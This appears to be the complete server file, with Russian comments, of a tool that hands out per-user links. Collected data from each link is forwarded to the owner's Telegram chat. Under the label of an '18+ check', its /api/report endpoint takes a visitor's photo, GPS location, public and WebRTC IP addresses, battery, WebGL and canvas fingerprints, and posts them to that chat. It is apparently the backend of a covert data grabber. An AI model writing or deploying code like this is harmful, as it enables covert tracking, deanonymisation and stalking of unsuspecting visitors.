// === server/index.js (code -> chat_id, pretty /:code, понятные ошибки) ===
import 'dotenv/config';
import express from 'express';
import path from 'path';
import fs from 'fs';
import Database from 'better-sqlite3';
import { fileURLToPath } from 'url';

// ==== ENV ====
const BOT_TOKEN        = process.env.TELEGRAM_BOT_TOKEN || '';
const STATIC_ORIGIN    = (process.env.STATIC_ORIGIN || '*').trim();
const PUBLIC_BASE      = (process.env.PUBLIC_BASE || STATIC_ORIGIN).replace(/\/+$/, '');
const ADMIN_API_SECRET = process.env.ADMIN_API_SECRET || '';
const DB_PATH          = process.env.DB_PATH || './data/links.db';
const PORT             = Number(process.env.PORT || 10000);

// ==== Paths / Static ====
const __filename = fileURLToPath(import.meta.url);
const __dirname  = path.dirname(__filename);
const PUBLIC_DIR = path.join(__dirname, 'public');

// ==== App ====
const app = express();
app.set('trust proxy', true);
app.use(express.json({ limit: '15mb' }));
app.use(express.urlencoded({ extended: true, limit: '15mb' }));

// --- CORS
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', STATIC_ORIGIN);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS, GET');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});
app.options('*', (_, res) => res.sendStatus(200));

// --- cache headers for static
app.use((req, res, next) => {
  if (/\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?)$/i.test(req.path)) {
    res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
  }
  next();
});

// --- static
app.use(express.static(PUBLIC_DIR));
app.get('/', (_req, res) => res.sendFile(path.join(PUBLIC_DIR, 'index.html')));

// ==== DB init ====
try {
  const dir = path.dirname(DB_PATH);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
} catch (e) {
  console.error('[db] mkdir failed for', DB_PATH, e);
}

console.log('[db] using', DB_PATH);
const db = new Database(DB_PATH);

// --- table (new scheme)
db.prepare(`
  CREATE TABLE IF NOT EXISTS user_codes (
    code       TEXT PRIMARY KEY,
    chat_id    TEXT NOT NULL,
    created_at INTEGER NOT NULL
  );
`).run();
db.prepare(`CREATE INDEX IF NOT EXISTS idx_user_codes_chat_id ON user_codes(chat_id);`).run();

// ---- optional migrate.sql (будет выполнен, если файл есть)
try {
  const migratePath = path.join(__dirname, 'migrate.sql');
  if (fs.existsSync(migratePath)) {
    console.log('[migrate] applying migrate.sql...');
    db.exec(fs.readFileSync(migratePath, 'utf8'));
  }
} catch (e) {
  console.error('[migrate] failed', e);
}

// ==== helpers ====
function requireAdminSecret(req, res, next) {
  const auth = req.headers['authorization'] || '';
  if (!ADMIN_API_SECRET || auth !== `Bearer ${ADMIN_API_SECRET}`) {
    return res.status(401).json({ ok: false, error: 'Unauthorized' });
  }
  next();
}

function escapeHTML(s = '') {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}
function b64ToBuffer(dataUrl = '') {
  const i = dataUrl.indexOf('base64,');
  const b64 = i >= 0 ? dataUrl.slice(i + 7) : dataUrl;
  return Buffer.from(b64, 'base64');
}

async function sendPhotoToTelegram({ chatId, caption, photoBuf, filename = 'report.jpg' }) {
  if (!BOT_TOKEN) throw new Error('No BOT token on server');
  if (!chatId) throw new Error('Missing chat_id');
  if (!photoBuf?.length) throw new Error('Empty photo');

  const form = new FormData();
  form.append('chat_id', chatId);
  form.append('caption', caption);
  form.append('parse_mode', 'HTML');
  form.append('photo', new Blob([photoBuf], { type: 'image/jpeg' }), filename);

  const url  = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
  const resp = await fetch(url, { method: 'POST', body: form });
  if (!resp.ok) {
    const text = await resp.text().catch(() => '');
    throw new Error(`Telegram ${resp.status}: ${text}`);
  }
  return resp.json();
}

async function sendMessageToTelegram({ chatId, text, parse_mode = 'HTML' }) {
  if (!BOT_TOKEN) throw new Error('No BOT token on server');
  if (!chatId) throw new Error('Missing chat_id');

  const url  = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const resp = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text, parse_mode })
  });
  if (!resp.ok) {
    const t = await resp.text().catch(() => '');
    throw new Error(`Telegram ${resp.status}: ${t}`);
  }
  return resp.json();
}

function safeJson(obj, space = 0) {
  try { return JSON.stringify(obj, null, space); }
  catch { return String(obj); }
}
function short(str, n = 64) {
  if (!str) return '';
  str = String(str);
  return str.length <= n ? str : (str.slice(0, n - 3) + '...');
}

// ==== health & debug ====
app.get('/health', (_req, res) => res.json({ ok: true }));
app.get('/api/debug/db', (req, res) => {
  try {
    const size = fs.existsSync(DB_PATH) ? fs.statSync(DB_PATH).size : 0;
    const codes = db.prepare('SELECT COUNT(*) AS c FROM user_codes').get().c;
    res.json({ ok:true, DB_PATH, size, codes });
  } catch (e) {
    res.status(500).json({ ok:false, error:String(e) });
  }
});

// ==== Admin: register-code ====
app.post('/api/register-code', requireAdminSecret, (req, res) => {
  try {
    const { code, chatId } = req.body || {};
    if (!code || !/^[A-Z0-9\-]{3,40}$/i.test(code)) {
      return res.status(400).json({ ok:false, error:'Invalid code' });
    }
    if (!chatId || !/^-?\d+$/.test(String(chatId))) {
      return res.status(400).json({ ok:false, error:'Invalid chatId' });
    }
    db.prepare('INSERT OR REPLACE INTO user_codes(code, chat_id, created_at) VALUES(?,?,?)')
      .run(String(code).toUpperCase(), String(chatId), Date.now());
    res.json({ ok:true, code:String(code).toUpperCase(), chatId:String(chatId) });
  } catch (e) {
    console.error('[register-code] error:', e);
    res.status(500).json({ ok:false, error:'Internal' });
  }
});

// ==== Pretty URL: /:code -> index.html?code=... ====
app.get('/:code([a-zA-Z0-9\\-]{3,40})', (req, res) => {
  const code = req.params.code.toString();
  let html = fs.readFileSync(path.join(PUBLIC_DIR, 'index.html'), 'utf8');
  const injected = html.replace(
    /<head>/i,
    `<head><script>history.replaceState(null,'','/index.html?code=${code}');</script>`
  );
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(injected);
});

// ==== API: client-ip (минимум; без внешних сервисов) ====
app.get('/api/client-ip', (req, res) => {
  const fwd = (req.headers['x-forwarded-for'] || '').toString().split(',')[0].trim();
  const ip  = fwd || req.ip || null;
  const country =
    req.headers['cf-ipcountry'] ||
    req.headers['x-vercel-ip-country'] ||
    req.headers['x-country-code'] || null;
  const isp = req.headers['x-real-isp'] || null; // можно прокидывать с edge
  res.json({ ip, country, isp, ua: req.headers['user-agent'] || null });
});

// ==== API: report (отправка фото + сводка и полный JSON) ====
app.post('/api/report', async (req, res) => {
  try {
    const {
      userAgent, platform, iosVersion, isSafari,
      geo, photoBase64, note, code,

      // НОВОЕ (из фронта):
      client_profile,   // быстрый мультисбор
      device_check      // { score, label, reasons[], details{...}, ... }
    } = req.body || {};

    if (!code)        return res.status(400).json({ ok:false, error: 'No code' });
    if (!photoBase64) return res.status(400).json({ ok:false, error: 'No photoBase64' });

    const row = db.prepare('SELECT chat_id FROM user_codes WHERE code = ?')
      .get(String(code).toUpperCase());
    if (!row) return res.status(404).json({ ok:false, error:'Unknown code' });

    // — короткая выжимка для caption (лимит у sendPhoto ~1024 символа)
    const cp = client_profile || {};
    const dc = device_check   || {};

    const webrtcCount = Array.isArray(cp.webrtcIps) ? cp.webrtcIps.length : 0;
    const dcWords = Array.isArray(cp.dcIspKeywords) ? cp.dcIspKeywords.join(',') : '';
    const net = cp.network || {};
    const bat = cp.battery || null;
    const webgl = cp.webgl || null;
    const canvas = cp.canvasFingerprint || null;
    const inApp = cp.inAppWebView || {};
    const locale = cp.locale || {};
    const pubIP = cp.publicIp || {};

    const caption = [
      '<b>Новый отчёт 18+ проверка</b>',
      `Code: <code>${escapeHTML(String(code).toUpperCase())}</code>`,
      `UA: <code>${escapeHTML(userAgent || '')}</code>`,
      `Platform: <code>${escapeHTML(platform || '')}</code>`,
      `iOS-like: <code>${escapeHTML(iosVersion ?? '')}</code>  Safari: <code>${escapeHTML(isSafari)}</code>`,
      geo ? `Geo: <code>${escapeHTML(`${geo.lat}, ${geo.lon} ±${geo.acc}m`)}</code>` : 'Geo: <code>нет</code>',
      cp.permissions ? `Perms: <code>geo=${escapeHTML(cp.permissions.geolocation||'?')} cam=${escapeHTML(cp.permissions.camera||'?')} mic=${escapeHTML(cp.permissions.microphone||'?')}</code>` : null,
      pubIP.ip ? `IP: <code>${escapeHTML(pubIP.ip||'?')} ${escapeHTML(pubIP.country||'')}</code> ISP: <code>${escapeHTML(pubIP.isp||pubIP.org||'')}</code>` : 'IP: <code>нет</code>',
      `WebRTC IPs: <code>${webrtcCount}</code>  DC-ISP: <code>${escapeHTML(short(dcWords, 40) || '–')}</code>`,
      `Net: <code>${escapeHTML(String(net.effectiveType||'')).toLowerCase()||'?'}, rtt=${escapeHTML(net.rtt!=null?String(net.rtt):'?')}</code>`,
      bat ? `Battery: <code>${bat.level}%${bat.charging? ' (chg)': ''}</code>` : null,
      webgl ? `WebGL: <code>${escapeHTML(short(webgl.vendor,40))} | ${escapeHTML(short(webgl.renderer,40))}</code>` : null,
      canvas ? `Canvas: <code>${escapeHTML(short(canvas.hash,18))} (${canvas.size})</code>` : null,
      inApp?.isInApp ? `InApp: <code>${escapeHTML((inApp.any||[]).join(','))}</code>` : 'InApp: <code>нет</code>',
      locale?.timeZone ? `TZ: <code>${escapeHTML(locale.timeZone)}</code>` : null,
      (dc && (dc.score!=null || dc.label)) ? `Check: <code>${escapeHTML(dc.label||'?')} (${dc.score ?? '?'})</code>` : null,
      note ? `Note: <code>${escapeHTML(note)}</code>` : null
    ].filter(Boolean).join('\n');

    // 1) Фото + краткая сводка
    const buf = b64ToBuffer(photoBase64);
    const tgPhoto = await sendPhotoToTelegram({
      chatId: String(row.chat_id),
      caption,
      photoBuf: buf
    });

    // 2) Полный JSON мультисбора и девайс-чека — отдельными сообщениями (чанки)
    const fullJson = safeJson({
      geo, userAgent, platform, iosVersion, isSafari,
      client_profile: cp, device_check: dc
    }, 2);

    const CHUNK = 3500; // запас по лимиту 4096
    for (let i = 0; i < fullJson.length; i += CHUNK) {
      const part = fullJson.slice(i, i + CHUNK);
      await sendMessageToTelegram({
        chatId: String(row.chat_id),
        text: `<b>Детали (${1 + Math.floor(i / CHUNK)})</b>\n<pre>${escapeHTML(part)}</pre>`,
        parse_mode: 'HTML'
      });
    }

    res.json({
      ok: true,
      sent: [{ chatId: String(row.chat_id), ok: true, message_id: tgPhoto?.result?.message_id }]
    });
  } catch (e) {
    console.error('[report] error:', e);
    res.status(500).json({ ok: false, error: e.message || 'Internal error' });
  }
});

// ==== 404 fallback ====
app.use((req, res) => {
  if (req.method === 'GET' && req.accepts('html')) return res.status(404).send('Not Found');
  res.status(404).json({ ok: false, error: 'Not Found' });
});

// ==== Start ====
app.listen(PORT, () => {
  console.log(`[server] listening on :${PORT}`);
  console.log(`[server] Public dir: ${PUBLIC_DIR}`);
  console.log(`[server] CORS Allow-Origin: ${STATIC_ORIGIN}`);
  console.log(`[server] PUBLIC_BASE: ${PUBLIC_BASE}`);
});
